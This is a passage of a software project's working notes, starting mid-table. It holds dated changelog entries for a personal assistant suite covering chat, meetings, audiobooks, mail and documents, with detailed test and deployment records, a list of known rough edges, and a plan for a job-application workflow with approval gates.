widths, light and dark, in four states, with nine checks of what the page promises each time: all pass, nothing wider than the window, no wrapped label, axe clean (it found the new list heading and the minutes' own headings out of order: fixed); Audiobooks at 11 widths, light and dark: no Voices on the library, Voices under Chapters (directly from 1024 up; Render comes between below that); the real minutes built twice through the page (4 pages), the first binned from the offer once its dialog said it was made today, the second by its id; the user's three earlier Docs of that title untouched, Drive back to 65. **Not run:** a real transcription again (hours, and it replaces a transcript; only the screen that asks was opened). | `meet-ai/CLAUDE.md` → For the Meetings page |

| 10-31 | **Chat made better (the user's request; all five changes they chose).** **Found:** an email waiting for approval was shown as one line of JSON that ran off a phone's screen, so it could be approved half read. Now an approval is titled as the tool calls itself ("Write a new draft", from MCP's tool titles, which the assistant now passes on), says which tool family, and shows what it was asked as labelled fields, each value whole and wrapped (To, Subject, the body). A reply's tool calls fold into one line ("3 steps", with their tools' icons) that opens to each step by its own title, what it was asked and what came back (the events already carried both). A **Stop** button replaces Send while a reply runs (`POST /api/chat/stop`; see `assistant/CLAUDE.md` → Stopping a reply). Changes made with buttons on other pages fold into one line ("You did this on another page"), and the suggestions show whenever there is no conversation (four such chips had hidden them). "Jump to latest" moved to the right, a round arrow on a phone: centred, it covered an approval's Decline. **Run:** assistant 217 tests (8 new, with a fake model), web 77 (9 new), fourteen deliberate breaks: thirteen caught, one an extra guard no test can tell apart (kept, and said so); in Chrome at 11 widths, light and dark, with a real conversation and a real draft's approval waiting (to the user's own address, declined after): nothing wider than the window, no field cut off sideways, no wrapped label, Stop offered, axe clean (it found the scrolling result boxes unreachable by keyboard: fixed); a real reply stopped while the model thought, then a new question answered; the approval's title found missing when it arrived live (the page dropped the field) and fixed. Nothing was sent or saved to Gmail: every draft was declined. | `assistant/CLAUDE.md` → Stopping a reply |

| 10-31 | **Speech models on an NVIDIA card, the player going on by itself, and the Render button (the user's requests).** **NVIDIA:** Pocket TTS (audiobook) and Whisper (meet-ai) use an NVIDIA card when there is one and the CPU when there is not, found by the code at run time (`tts.place`; `transcribe.load_whisper`/`choose_device`, which loads cuBLAS 12 first, the one library CTranslate2 4.8 needs on a card, read from the library itself). A card that refuses the model falls back to the CPU and says why; the chunk cache's key is unchanged on the CPU. The install decides what a machine gets: `./setup` and `./start-docker` find a card by its driver and install NVIDIA's builds (`audiobook/requirements-nvidia.txt`, `meet-ai/requirements-nvidia.txt`; `compose.nvidia.yaml`; `SUITE_GPU=cpu` in `.env` keeps the CPU), 3.65 GB + 0.6 GB more than the CPU builds. Speaker labelling (sherpa-onnx) stays on the CPU. **This laptop has no GPU PyTorch can use** (Intel UHD 620, and an AMD Polaris card the driver does not list for compute), so it is unchanged. **Not run on a GPU:** the NVIDIA package sets were resolved (`pip install --dry-run`, 141 packages, `pip check` clean), detection was run against stand-ins in five situations, and the CPU path was run for real after the change (a sentence in `abigail`, 1.09x real time, Whisper read it back word for word). **Player:** a chapter plays on to the next that has audio when it ends (a switch, remembered in this browser, on by default; the next is fetched 90 s ahead; headphone next and previous buttons; "Up next" under the player); played to its end in Chrome on the real book, the switch turned off, and the last chapter, which stops. **Found and fixed:** Render offered "all chapters" for a book whose chapters were nearly all rendered, because every chapter started ticked: now only those with no audio are, and a finished book says so. The player's controls overlapped in a narrow column of a wide window (beside the Render card, in the side column at 1024 and 1066) and a file there pushed the page wider than the window; both now follow their own width. **Run:** meet-ai 131 tests (10 new), audiobook 137 (6 new), web 84 (7 new), seventeen deliberate breaks each caught (one was not, from a test whose list order happened to hide it: fixed); in Chrome at 11 widths, light and dark, in two player positions: nothing wider than the window, no overlapping control, no wrapped label, axe clean. | `audiobook/CLAUDE.md` -> Target hardware, `meet-ai/CLAUDE.md` -> Measured facts |

| 10-31 | **Settings that say what is wrong, the Audiobooks cards, the docked player, and chapter openings (the user's requests).** **Settings (all five changes they chose):** (1) a login that is out is one fix in the banner, in plain words: "Signed out of the model, Google Docs and Gmail", the one command `./auth` with Copy, the raw error folded under "Technical detail" (the bottom callout shows only when nothing is out). (2) The Google logins are checked, not guessed: mail-ai and docu-ai each offer a read-only `login_status` that asks Google whether their own token still works (only `invalid_grant` is dead; no network is "could not tell", never "fine"; nothing is written), and `Logins` in the assistant remembers the answers, announces a change once, and checks every ten minutes, every minute while one is out. (3) apply-ai and web-ai are Applications and Web, with icons (briefcase, globe) and colours (slots 6 and 7); last actions are in the tool's own title ("Bring the local mailbox level with Gmail"), not `mail-ai · sync`. (4) The sidebar's model dot turns red and says "Signed out" (in the top bar on a phone too), and links to Settings. (5) Network: "No IPv6 on this connection" once, and no IPv6 column or line per service when none answered; the table view is a focusable scroll region (axe `scrollable-region-focusable`). **Audiobooks:** the Render card sits under Chapters, folded to one line ("Render 2 chapters · abigail, speed 0.95") and folding itself again once a render is started; the Listen card sits under it too, so Chapters, Render, Listen and Voices are one column. Tapping the docked player opens the book it is playing with that chapter in view and its player on screen (from another page or from the library), and follows an auto-advance. **Chapter openings:** "Chapter 6 Knowing the Source of Your Dreams" was said as one phrase with no breath between the label and the title; now the label is a sentence of its own, 0.7 s of silence, then the title (`render.announcement`). Checked with the real abigail voice and silence detection (before: no silence between them; after: about one second); **not listened to by ear**, and the user's finished chapters keep the old openings until they are rendered again (the body is cached, so a re-render is only the new title chunks). **Run:** assistant 248 tests (31 for logins), mail-ai 177 (24 new), docu-ai 20 new, audiobook 154 (17 new), web 106 (22 new); twenty-five deliberate breaks each caught (two first missed: a break whose test file was not in the run, and a pattern that did not match; both fixed); on a second copy of the stack on other ports, with the real logins, in Chrome at 11 widths from 360 to 1920 in both themes: Settings (chart and table view, the words, the fix, IPv6 once, the pill) all pass, nothing wider than the window, no wrapped button, axe clean; then with Gmail's token swapped for one Google never issued and Docs' removed, Google's real `invalid_grant` showed as three things signed out and one `./auth`; Render and Listen cards at 11 widths in both themes; the docked player against the real Dreams and Visions at 390, 1066 and 1440 (from Overview, from the library, and after the next chapter took over). The real tokens were never touched and nothing was rendered. **Not deployed:** a 4.5-hour render of another book was running (started by the user at 11:48), and a container restart interrupts it, so the backend and the new web build were not redeployed; the Render and Listen layout is live (deployed before it started), the rest waits. | `assistant/CLAUDE.md` -> Every login at a glance, `audiobook/CLAUDE.md` -> How a chapter opens |

| 10-31 | **The model through an Anthropic API key, and every page working with no model (the user's requests: an Anthropic key is enough for now, Bedrock ends at the end of November, and Mail, Meetings, Documents and Audiobooks must work fully without the assistant).** An `ANTHROPIC_API_KEY` in `.env` already won over Bedrock in the code; what was missing is now built. **Settings and the sidebar** tell a key's failures apart, each fixed differently: *key refused* (Anthropic's real 401; replace it in `.env`, then `./start-docker up`), *model not available to this key* (names what the key can use; `SUITE_MODEL` in `.env`), *not reachable*; and a model that is simply **not set up** is information, not a fault ("Everything is working. No model is set up, so Chat and meeting notes are off"; the pill says "No model"). `model_status` asks the API for the model by id (one read, nothing spent). `./auth` checks the key instead of AWS when one is set (`anthropic dead: the API key was refused`, run against the real API with a key it never issued). `SUITE_MODEL` names the model for chat and for meeting notes; the first-party default moved to `claude-opus-5-5`. **Chat** says "The Anthropic API key was refused" / "No model is set up" / "The model's login has expired" with a link to Settings, not "Something went wrong: <botocore text>", and keeps the raw error beside it. **Meeting notes and minutes** with no model say "No model is set up, so notes cannot be written. ... Recording, transcribing and reading a meeting do not need a model" before anything else (the SDK's own words were "No AWS region was provided"). **Proved with no model at all** (no key, no AWS login, on the test copy): Mail (status, list, search), Audiobooks (voices, finished audio, job status), Meetings (recordings, a notes preview), Documents (a real Google Doc built from a throwaway upload and moved to the bin, Drive confirming it was in the Trash) and every tool's health all work; Chat and the notes say plainly why they cannot. **Not run:** a real key that Anthropic accepts (there is none here), so the accepted path, and whether `claude-opus-5-5` is a model a real key can use, are unproven until one is in `.env` (Settings will say so plainly if not); no other provider (an Anthropic key is enough for now: the two model calls use Anthropic's thinking, effort and JSON-schema features, and another vendor would need an adapter at each). **Run:** assistant 269 tests (52 for logins, the model and the key), meet-ai 146 (15 new), web 114; twenty-one deliberate breaks each caught (one first missed, from a test whose config already had no AWS settings: fixed); the key is withheld from every tool but meet-ai (checked on a running copy by reading each process's own environment: the backend and meet-ai held it, the other six tools did not); meeting notes with a refused key say so ("The Anthropic API key was refused, so notes cannot be written") instead of "Error executing tool generate_notes", against the real API; in Chrome at 390 and 1066, light and dark, in each model state (refused key, no model): nothing wider than the window, axe clean, the pill, banner, model card and Chat's error read. | `assistant/CLAUDE.md` -> Every login at a glance, `CLAUDE.md` -> The model is optional |
| 10-31 | **Previous and next chapter buttons on the audio player, and Back that goes where you expect (the user's requests).** A chapter of a book now has previous and next buttons either side of back 15 / forward 30 (dimmed at the first and last chapter, named for the chapter they go to); the headphone buttons already did this. The five buttons make the middle 92 px wider, so the player's width steps for a chapter moved up by that much. **Found by reproducing it in Chrome as a phone:** Back skipped everything opened inside a page, because only the page is in the URL: from an open book it went to Chat, and the More sheet stayed open over the page it landed on. `useLayer` now records an open book, a Mail message or composer, a meeting (below 820 px; side by side the newest opens by itself, which would trap Back), and the More sheet and search box in the history entry, so Back closes it, the "All books" button leaves the same history, and coming back to a page finds the book open. **Run for real** on the real book through the dev server (the running app untouched): all 28 checks (18 presses of Back) on a phone and a 1066 px window landed where expected; the player at 14 widths from 280 to 1920 (light, and dark at five), none over the window or over another control, axe clean (one dark-mode sidebar flag at 1440 did not come back in two re-runs); Next and Previous clicked for real on Chapter 1 (to Chapter 2 and back), and the first and last chapters dimmed the right button. **Not done:** the docked player has no previous/next (no room on a phone); the delete confirmation and a chapter's text are not layers, so Back leaves the page from them; Previous always goes to the previous chapter (it does not restart this one first). | `web/DESIGN.md` -> Back, `web/src/ui/useLayer.ts` |
| 10-31 | **Layer 1b, phase A: the central file store (the user's go-ahead: "lets start implementing it").** Every upload and every draft the assistant writes now goes to `data/files/<id>/<its own name>`, recorded in a new `files` table (`002_files.sql`; `index.json` with no database). Delete and serve by id (`/api/uploads/delete {id}`, `GET /api/files/{id}`); the same name uploaded twice keeps its name. The old `data/assistant/uploads` is copied in once on start (checked by hash, dated by modification time, drafts kept as the assistant's), then each folder renamed `.imported`; `exports/` stays. apply-ai reads from the store. The web app deletes by id. **Run for real** on a copy of the real uploads, with a second backend (port 8760, no tools) on a throwaway Postgres, the live containers untouched: it copied in 2 recordings, 4 books and 4 draft folders; the listing had the same names, sizes, upload times and draft marks as the live backend's; every stored file matched its original's SHA-256; the `files` table held 2 audio, 4 book and 4 docs rows; a throwaway PDF went in, came back by id as `application/pdf`, and was deleted by id. In the web app (dev server on that backend, Chrome as a phone): Documents and Meetings each deleted the one throwaway they showed and kept its namesake, and every real upload was still there afterwards. **Not done:** deployed (it needs `./start-docker up`, which interrupts a running render, and ships the rest of the uncommitted work); Audiobooks' delete button pressed for real (its dialog asks the audiobook tool first, which that backend did not run; the changed line is the same id swap as the other two). | `assistant/CLAUDE.md` -> Uploads, and the file store; layer 1b above |
| 11-01 | **Layer 1b, phase A: markdown in the database, lent to a tool for one call (the user's decisions of 10-31: uploaded markdown goes into the database and docu-ai and apply-ai read it from there; the assistant owns the data and no tool gets the database).** An uploaded or drafted document is a `docs` row in `files` plus one `file_texts` row per file (`003_file_texts.sql`), written in one transaction, and nothing of it is on disk between calls. Every call to a tool runs inside `registry.lend(arguments)`: a document its arguments name (at any depth) gets a read-only copy under `ASSISTANT_TEXTS` for that call, with `.draft` in a draft's, removed when the call ends; two calls share one copy; leftovers are cleared on start. `read_document` and `write_draft` use the database directly. Uploads hold a batch in memory until done (20 MB, 5 open, an hour), refuse anything not UTF-8 or holding a NUL, and the old `docs/` folders are imported into the database and checked by hash. apply-ai's root is now the lend folder; in the containers it is `/tmp/assistant-texts`, not under `/data`. **Run for real** on a copy of the real uploads, a second backend (8760) with real docu-ai and apply-ai processes and a throwaway Postgres, the live containers untouched, 28 checks: the 4 drafts went in with the same SHA-256 per file as the originals and the same names, times and draft marks as the live listing, with nothing on disk; `read_document` returned a draft whole (7,244 characters); docu-ai previewed a draft and a two-file upload from lent copies; apply-ai refused a draft by its marker and read an upload's line as evidence; neither tool process had `DATABASE_URL` (read from `/proc`), the backend did; deleting removed the record and both texts; nothing was left lent. In Chrome as a phone on that backend, the Documents page uploaded two files, showed "What will be built" for them and for a real draft, and deleted the upload (9 checks). Thirteen deliberate breaks: twelve caught, one (a non-markdown record let into a lend) not observable, since such a record has no text and a second check lends nothing. **Not done:** deployed (as above). | `assistant/CLAUDE.md` -> Uploads, and the file store |
| 11-01 | **Layer 1b, phase B: audiobook's finished work kept by the suite (shape A, the user's choice: the tool labels, the assistant files without knowing what it is, the page reads it back).** audiobook offers `inventory` and `release` (`keeping.py`); the assistant collects (`collect.py`) at start, after a call that changed something, and when a job finishes a chapter or ends; files go to the store (`kind made`), records to `records`/`record_files` (`004_records.sql`), and the tool lets go of finished audio once filed (hash-checked). A render now writes each chapter's exact spoken text beside its MP3. The page lists, plays (by file id), matches to chapters (by the tool's `stem`) and deletes through the records (`web/src/components/audiobookKept.ts`). **Run for real** in a container built from this code, on a copy of the real data (the 4 books, `output/`, voices, jobs) and a throwaway Postgres, the live containers untouched: all 105 audio files filed with their originals' SHA-256 and released (4 of them loose September tests at the top of `output/`, which the first inventory missed: found on the real data, fixed, filed by a restart that changed none of the other 116 records); 3 voices filed and left at the bench; 12 jobs filed with readable logs. In Chrome as a phone, the test page showed exactly what the live page shows: 5 books with the same audio counts and sizes, and for each book the same chapters with audio (2/2, 19/62, 36/37, 17/19), the same other files and the same 2 samples; a chapter played from the store by its id (one fetch, 623 s); deleting The Final Quest's audio removed its 7 kept files and nothing else; nothing wider than the window at 390 and 1066. Then a real render of one chapter (9 words, abigail) was filed with its exact text, voice, PDF and length, replaced the old kept copy (whose file left the store) and left nothing at the bench. Eighteen deliberate breaks, all caught, one only after a test was added (a link to the tool's own file was not tested). A test also found a real bug: a job's log read as text turned each progress update into a line. **Deployed 2026-11-01 (the user's "deploy")**, after copying `data/audiobook/output` to `output.before-phase-b` (117 files, 802 MB, checksums identical): the first live collection took 20 s and filed all 105 audio files with their SHA-256 verified against checksums taken before (0 problems), 3 voices, 12 jobs, 4 loose tests; the bench holds no audio, the 4 uploads untouched. **Found on the live page and fixed in a second deploy:** Dreams and Visions was titled "Praise for" for its first 5 seconds (an old chapter's MP3 tag, from an early wrong reading), because the tool no longer lists a book whose audio it has let go; the tool now hands over each book's title and author as a `book` record, which the page uses first, and it is deleted with the book's audio. **Chapters rendered before today have no text** (their MP3 tags only; today's plan may not be what they say). `plan.json` and `preview.md` stay at the bench as working files. | `assistant/CLAUDE.md` -> What tools made, kept; `audiobook/CLAUDE.md` -> The suite integration |
| 11-06 | **Past conversations in Chat (built 11-05, finished and checked 11-06).** Each conversation is kept in the database when a turn ends or Chat is cleared (`005_conversations.sql`); the History panel lists them by day, opens one read-only, renames and deletes them, and New chat keeps the current one and starts empty. **Found by running it, and fixed:** the conversation Chat was in, deleted from the list, came back with its next message (old title, deleted messages); it now leaves Chat too, refused mid-reply, and a rename of it survives the next turn. The migrations test did not know 005. The panel stayed on the page when closed (its buttons reachable by Tab), Back left Chat instead of closing it, titles were centred, the menu button was 30 px on a phone, and two font sizes were literals. **Run:** assistant 340 tests (11 new), and with a throwaway PostgreSQL 355 with none skipped; five deliberate breaks each caught; on a throwaway backend (8760) and the dev server, in Chrome as a phone and a desktop, 31 behaviour checks (send, list, Escape, Back, Forward, open, rename, delete, New chat, each checked against the API) and every width from 360 to 1920 in both themes: nothing wider than the window. Axe is clean in the panel; it finds one older thing in the sidebar, seen on Chat at 1066, 1440 and 1920 (the `Jump to` button, `label-content-name-mismatch`; not part of this change), left for its own. **Not deployed.** | `assistant/CLAUDE.md` -> Past conversations |
| 11-06 | **Voice input in Chat (the user's request, step 2 of the voice plan).** A microphone in the chat box records a clip in the browser; meet-ai's new `dictate` turns it into words with a small Whisper (base.en, kept loaded between clips, let go after ten idle minutes) and the words land in the message box, to be sent by hand. Nothing is kept: the backend's `PUT /api/dictate` deletes the clip, does not audit or note it, and the tool is `interface_only`, so the model is never shown it. Esc throws a clip away; it stops by itself at two minutes; a refused microphone says what to do. **Measured first:** distil-large-v3 took 18-20 s on a 10 s clip, base.en 1.4-1.6 s. **Found by running it, and fixed:** on a phone a tap on the microphone did nothing, because focus in the chat box hides the tab bar and moved the box 64 px between press and release (the buttons now keep focus where it was); headless Chrome reports no pointer, so the touch test is a coarse pointer, not no-hover; hover paled the recording button. **Run:** meet-ai 155 tests (9 new), assistant 348 (8 new), web 139 (6 new); five deliberate breaks each caught; through the real route an 8 s clip word for word in 2.0 s (3.9 s with the model loading); in Chrome with a microphone playing a known clip, as a phone and a desktop, 37 checks (the words, a second clip after typed text, Esc, one request per clip, nothing kept, focus, a refused microphone) and the recording state at 7 widths in both themes, axe clean on the chat box. **Not run:** the user's own voice, a real phone, and the containers (not deployed; their cache lacks base.en). | `meet-ai/CLAUDE.md` -> Dictation; `assistant/CLAUDE.md` -> Dictation |
| 11-06 | **Replies read aloud in Chat (the user's request, step 3 of the voice plan).** Each reply has a speaker button beside Copy that reads that reply when pressed, and nothing is read by itself (the user's choice: a Speak replies switch that read each new reply was built, then taken out the same day). The page turns the markdown into sentences (code and tables are said to be on screen, never read; a link is read by its words) and asks audiobook's new `speak` for one at a time while the one before plays; audiobook keeps Pocket TTS loaded, 8-bit, in abigail, and lets it go after ten idle minutes. Dictating or sending stops a reading; an audiobook playing is paused. Page-only (`interface_only`), not audited, nothing kept. **Measured:** the user chose Pocket TTS over Piper (Piper medium was 9.5x real time here but cannot speak in abigail) and asked for it faster: 8-bit is 2.0x against 1.38x, likeness 0.953 against 0.957; through the real backend 1.3-2.0 s per sentence after a first call of 9.8 s (loading), and Whisper read all five sentences back word for word. **Run:** audiobook 183 tests (12 new), assistant 354 (6 new), web 151 (12 new); four deliberate breaks each caught; in Chrome (its normal autoplay rules) against a copy of audiobook and a stand-in model, as a phone and a desktop: no reply read by itself; a press reads that reply whole, a sentence per call (first sound 1.9-2.1 s after the press), another reply's button switches to it, Stop stops mid-sentence with nothing more asked for, and the microphone and a new message each stop it; the reply's buttons at 6 widths in both themes, axe clean. **Not run:** listened to by ear, a real phone, an audiobook actually paused by it, and the containers (not deployed). | `audiobook/CLAUDE.md` -> Speaking a chat reply; `assistant/CLAUDE.md` -> Dictation, spoken replies |
| 11-06 | **Continue a past conversation (the user's request).** A conversation opened from History shows the message box; writing in it makes it the one Chat is in, with what the model remembered of it given back: each save now keeps the model's own messages (words, tool calls and results, thinking with its signature; `006_conversation_messages.sql`), and conversations kept before that are continued from their words. The current one is kept first; refused mid-reply; audited. **Found while building it, and fixed:** a failed save named a logger server.py never had, so a database hiccup at the end of a reply would have raised. **Run:** assistant 377 tests with a throwaway PostgreSQL, none skipped (8 new); five deliberate breaks each caught; in Chrome against a stand-in model that answers with how many messages it remembers, as a phone and a desktop: a continued conversation's reply said "I remember 5 messages. You first asked: What did Kwame say about the budget?", New chat remembered nothing, both were kept, an older conversation continued from its words; a past chat open at 6 widths in both themes, axe clean. **Not run:** a real model continuing (whether the API takes back every kept block, such as thinking, is checked by shape only). | `assistant/CLAUDE.md` -> Past conversations |

Test counts on 2026-11-01, after layer 1b phase B (one `./test` run, all passed): assistant 329 + 14 Postgres tests that skip without `TEST_DATABASE_URL` (test_database, test_files and test_collect, 53 tests, all passed against a throwaway one), meet-ai 146, mail-ai 177, apply-ai 111, web-ai 149, audiobook 163, docu-ai 415 (+1 skipped, the live test), web 129 (+ typecheck), publish 15.

## Known rough edges

Real, known, not yet fixed. Each is small unless marked.

- **Names in transcripts are misheard** ("Akra Tema", "Pretext", "Godwin Daydrew"). The fix exists —
  spelling facts in the assistant's memory become a lexicon applied before the model sees the
  transcript — but needs the correct spellings from the user (see below).
- **Numbered lists restart** in docu-ai when a quote or code block sits inside an item; each list
  segment gets its own `createParagraphBullets`. Unordered lists are unaffected.
- **Quotes in notes Docs sit at the left margin**, not under their bullet: Docs' PDF export ignores
  `indentStart` (docu-ai's CLAUDE.md). Would need a border-based inset per nesting level.
- **Speaker attribution is unreliable** on single-mic recordings; nothing is attributed by speaker
  label. Speaker enrollment is meet-ai's intended next step (its `plan.md`, M3b).
- **Transcription ETA is optimistic** (it slipped ~2× on the 2-hour meeting).
- **The terminal assistant (`assistant-cli`) has no upload or drafting tools** — those are
  registered only by the web server, which owns the uploads folder.
- **A CV keeps all its content unless a page target says otherwise.** `docu_ai__build` takes `maxPages` and
  reports the real page count; the model cuts the least relevant points to meet it and the draft check shows
  what was cut. The first trim in a real run also dropped three honest qualifiers; `apply_ai__claims` now
  notices a dropped limit, but misses a rewrite that merges several bullets into one.
- **Interface, small things.** Recording shows a clock and a state but no live audio level (the tool exposes none; peak dB appears after stopping). The charts have no zoom or export. Not tested on a real iPhone or an older Android browser: it was checked in Chrome at phone width with touch emulation, and `:has()` (the keyboard-aware chat on a phone) needs a 2023-or-newer browser, falling back to a tab bar that stays visible.
- **Audiobook, small things.** One job at a time (reading, rendering and cloning share the CPU). A
  file plays only once it has been fetched whole (the token travels in a header, so it is a blob, not
  a streamed URL): a four-hour M4B is ~115 MB before the first second. A book is opened from an upload or by pasting its path — PDFs
  already in `~/Documents/books/` are not listed. Corrections are edited per book but not yet taught
  from chat. A render of a long book is hours (final-quest: ~4 h of audio), which is the machine,
  not the tool.

## Gaps found on 2026-10-24, and the plan to close them

A third real application, made with the checks built on 2026-10-15, showed what the system still cannot do.
**Nothing below is built.** Each gap was hit for real, and the code was read before the plan was written.

### What was hit

1. **Two copies of the state.** `./start` on the host keeps memory, uploads, audit log and mailbox beside the code;
   the containers keep them under `./data` (`compose.yaml` sets `ASSISTANT_MEMORY`, `ASSISTANT_UPLOADS` and the
   rest). On 2026-10-24 the host memory file held 9 facts and the container's 15, and the source CV differed
   between the two (the host copy has a later correction). The user was asked questions the other copy could
   already answer.
2. **No record of one application.** The posting, the confirmed facts, the drafts, the Google Doc ids and the
   email draft id lived in a scratch folder, `uploads/docs`, Drive, Gmail and a session's notes.
3. **No way to read a real posting.** It was on a script-driven site and was found only by reading that site's own
   API. A page fetch that summarises returned wrong labels for the site's figures. `apply-ai` takes pasted text only.
4. **The checks cannot see outside the user's files.** A CV line saying the repositories were private passed every
   check while most of them were public; `apply-ai` has no network, on purpose. It also flagged facts about the
   employer (a paper's name and year) as unsupported, because only the posting was given as context.
5. **docu-ai.** Word export fails: `exportDocumentWith` gets a `Blob` for `docx` and throws (`drive.ts`), and the
   CLI's `export` is PDF only. `resume` and `letter` do not print the page count (`build` does; a comment in
   `cli.ts` says `resume` does too, and is wrong). Every Doc is titled with its first heading. That is deliberate
   (`cmdOneDocument`: a résumé's heading is the name), but it leaves a CV and a letter with the same title in
   Drive. Each rebuild makes a new Doc, so superseded ones are trashed by hand.
6. **mail-ai.** A draft cannot carry attachments, and cannot be edited from the command line (`drafts.update`
   exists in the module; the CLI does not offer it). The mailbox was five days stale because nothing syncs it on a
   schedule. *The schedule is fixed (2026-10-30): the backend syncs every 30 minutes, open page or not.*
7. **No pre-publish check.** Making `suite` public needed a hand-built scan of every commit. This file also mixed
   private operating notes with public documentation.
8. **The web app cannot open or download a built document** (also on the user's own to-do list). *Stale: the
   Documents page has opened Docs and downloaded them as PDF or Word since 2026-10-16 (`d5d5da2`).*

### The plan, in order

Sizes are rough. Steps 1 and 2 change docu-ai and mail-ai, so confirm with the user first.

0. **One state location (small).** `./start` exports the same paths under `./data` that `compose.yaml` uses. Merge
   memory by fact id. Show the user both copies of the source CV so they pick the current one. Delete nothing until
   they have.
1. **docu-ai (small).** Fix Word export (ask Drive for an array buffer, as the PDF export already does); let
   `export` choose the format from the file extension; make `resume` and `letter` print the layout report and fix
   the wrong comment; an optional title argument whose default stays the first heading; a `replaces <docId>`
   option that trashes the old Doc only after the new build succeeds, through the existing `trash`; write Word and
   PDF together. Tests need no credentials, as now.
2. **mail-ai (medium).** `./mail edit`. Attachments from the uploads folder only, under the same hostile-name rules
   as uploads. Attachment names and file hashes go inside the send fingerprint, so changing one invalidates a
   review the way `bcc` does. `send` still has no content parameter and the test that says so stays. Sync every
   30 minutes. *Attachments built 2026-10-29; the sync every 30 minutes built 2026-10-30, in the backend (see
   "Built and verified"). `./mail edit` is not built.*
3. **A new `web-ai` tool, read-only (medium).** `read_page`: plain HTTP first, then a headless browser for
   script-driven sites; returns text with the URL, time and method, never a summary. `check_link`. And
   `github_visibility`, asked without a login so it answers what a stranger sees. GET only, no cookies or headers,
   private and local addresses refused, size and time limits, every call audited. Page text is untrusted data.
   Tests use a local fake server, no network.
4. **apply-ai (small to medium, stays network-free).** Accept link-check results and employer text as data, as it
   takes `facts` today. Flag a "private" or "confidential" claim next to a link that resolves publicly. Tune the two
   false alarms seen: a negated "not deployed to production", and a limit still present in reworded text.
   **Done 2026-10-30, but one piece:** link results (`public_links`) with a private claim flagged; employer text
   (`employer`), which sets apart what a sentence addressed to them takes from their pages; a negation four words
   back within its clause ("has not been deployed to production"); and a limit kept anywhere in its paragraph.
   **Not done:** a limit kept in other words ("a colleague runs the clusters") is still flagged; a word-overlap
   check cannot see it. A sentence mixing the employer's figure and a claim about the user stays a finding, marked.
5. **Dossiers and fact provenance (large; do it with "Agent memory and a database" below).** A dossier is a
   generic record of one goal: a title, a status, ordered references (a Google Doc id, a Gmail draft id, a file, a
   URL) and facts scoped to it. No job logic in the assistant. Each fact gets a source (who said it, when) and a
   scope (global, or one dossier); an unconfirmed fact cannot be passed as `facts`. Memory stays the assistant's
   own state, which no tool may read.
6. **Web app (medium).** A Documents page that lists drafts with Word and PDF download (the file-serving rules
   already used for audio, with an extension allow-list); later a dossier view.
7. **Repo hygiene (small).** A `./publish-check` script: secret patterns across all history, plus the non-secret
   exposures (server ids, emails, names). Private operating notes move to a git-ignored file. The decision on the
   public history is item 10 under "Waiting on the user". **`./publish-check` built 2026-10-30** (see "Built and
   verified"). Not done: moving private operating notes out of tracked files (this file still names the instance).

### Not building

Auto-send; a model inside the checks; a browsing agent; a workflow engine; a networked `apply-ai`.

### How we will know it works

Run the 2026-10-24 application again from nothing but the employer's address. The posting is found; only what
memory lacks is asked; a CV and letter come out as Word and PDF; a false "private" claim is flagged; an email draft
with both attached is made for the user to send; all of it sits in one dossier. Look at the output, as everywhere
else here.

## Job application workflow (2026-10-25)

**Built, and run end to end through the model on 2026-10-30** (see "Built and verified"). The goal: post a URL — a company website or a job listing — and the
assistant scans the site, understands the company, finds vacancies, tailors a CV, drafts a cover
letter, and sends the application email with attachments. Every destructive step has an approval gate.

This is the use case that ties gap-plan steps 2, 3 and 4 together. Dossiers (step 5) track
applications but are not blocking — the workflow works without them.

### The flow

1. The user posts a URL.
2. `web_ai__read_page` fetches it → raw text, no summary.
3. If it is a careers page (not a specific listing), the assistant reads the text, finds vacancy
   links, shows them. The user picks one. `read_page` again on that link.
4. `apply_ai__requirements` with the posting text from web-ai + the user's CV files.
5. The assistant asks gap questions (existing, unchanged).
6. The assistant drafts CV + cover letter (existing, unchanged).
7. `apply_ai__claims` verifies both drafts (existing, unchanged).
8. `docu_ai__build` + `layout` for each document (existing, unchanged).
9. `docu_ai__export` each as PDF → base64.
10. `mail_ai__draft_new` with the PDFs attached, the recipient from the posting, a subject line and a
    brief email body.
11. Review gate — the user sees the full email with attachments listed before anything sends.
12. `mail_ai__send_draft` — two-press gate, as today.

If the posting says "apply through our portal" (no email), the assistant prepares the documents but
stops before composing an email, and tells the user to upload manually.

### What is missing (three pieces)

**1. web-ai (gap-plan step 3). BUILT 2026-10-28** (`web-ai/`; see "Built and verified" and `web-ai/CLAUDE.md`). Where it differs from this text: `read_page` also returns `links` (the careers-page step needs them, and text alone loses them), `title`, `final_url`, `status`, `truncated`, `warnings` and `next`; there is **no headless-browser fallback** (a page that builds itself in script comes back nearly empty and says so); and a failed fetch is an error result, so the audit log records it as failed. A read-only MCP tool that fetches web pages and returns raw text.
No model, no summarisation, no cookies. `read_page(url)` → `{url, text, time, method,
content_type, size}`. Plain HTTP first; headless Playwright fallback for JS-heavy sites (optional —
if not installed, the tool says "paste the posting text instead"). `check_link(url)` (HEAD only) and
`github_visibility(url)` (unauthenticated GET). Safety: GET only, no cookies, private/local
addresses refused (resolve before connecting), 5 MB cap, 30/60 s timeout. Follows the apply-ai
pattern: own folder, `mcp` shell script, one entry in `tools.yaml`, shared `.venv`. Tests use a
local fake server, no network.

**2. mail-ai attachments (gap-plan step 2). BUILT 2026-10-29** (see "Built and verified" and `mail-ai/CLAUDE.md` → "Attachments"). Where it differs from this text: each file is fingerprinted by name and by content, with every field behind its own length; `review` lists every file above the body; a file whose bytes cannot be read stops the review and the send; and how the bytes reach `draft_new` is undecided (item 13 under "Waiting on the user"). As planned: `draft_new` gains `attachments: [{filename, data,
mime_type?}]` where `data` is base64. A CV + cover letter is ~300 KB — fine for MCP. `compose.py`
produces `multipart/mixed` MIME when attachments are present, single-part when not. The fingerprint
covers attachment filenames and content, so changing an attachment between review and send is caught.
`review_draft` shows attachment names and sizes in the preview. No new dependencies (Python `email`
stdlib). The alternative was file paths with a `MAIL_AI_ROOTS` env var, but the document size does
not justify the extra machinery.

**3. Orchestration descriptions.** The flow is encoded in tool descriptions and `next_step` response
fields — the existing pattern (apply-ai already does this). No change to the assistant's prompt.
`read_page` description: "pass the text to `requirements` as the posting." `export` description:
"pass the base64 to `draft_new` as attachments." `draft_new` description: "attach the exported
PDFs." apply-ai's descriptions already say "USE THIS FIRST" — no change.

### Edge cases

| Case | Handling |
|---|---|
| Portal-only (no email) | Detect from posting text, prepare docs, tell user to upload manually |
| JS-heavy careers page | Playwright fallback; if absent, ask user to paste text |
| Direct listing URL vs homepage | Assistant reads the text and adapts |
| PDF posting link | Detect content-type, refuse with "paste the text instead" |
